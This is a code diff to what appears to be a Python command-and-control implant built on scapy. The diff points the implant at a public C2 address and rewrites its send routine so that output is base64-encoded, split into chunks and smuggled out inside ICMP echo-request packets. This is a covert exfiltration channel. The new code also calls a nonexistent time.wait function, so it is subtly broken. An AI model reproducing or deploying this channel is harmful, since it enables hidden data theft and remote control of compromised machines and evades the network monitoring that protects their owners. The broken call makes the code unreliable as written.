@@ -6,15 +6,20 @@ from base64 import *
 import os
 import time
 
-c2_server="192.168.6.11"
+c2_server="13.53.243.249"
 stop=0
 send_mutex=Lock()
+chunk_size=1300
 
 def send_res(content):
 	try:
-		frags=fragment(IP(dst=c2_server)/ICMP(type="echo-request")/b64encode(content.encode('ascii')))
-		for frag in frags:
-			send(frag, verbose=False)
+		global chunk_size
+		payload = b64encode(content.encode('utf-8'))
+		payload_frag = [payload[i-chunk_size:i] for i in range(chunk_size, len(payload)+chunk_size, chunk_size)]
+		for frag in payload_frag:
+			packet=IP(dst=c2_server)/ICMP(type="echo-request")/frag
+			send(packet, verbose=False)
+			time.wait(1/50)
 	except Exception as e:
 		print(e)
 		
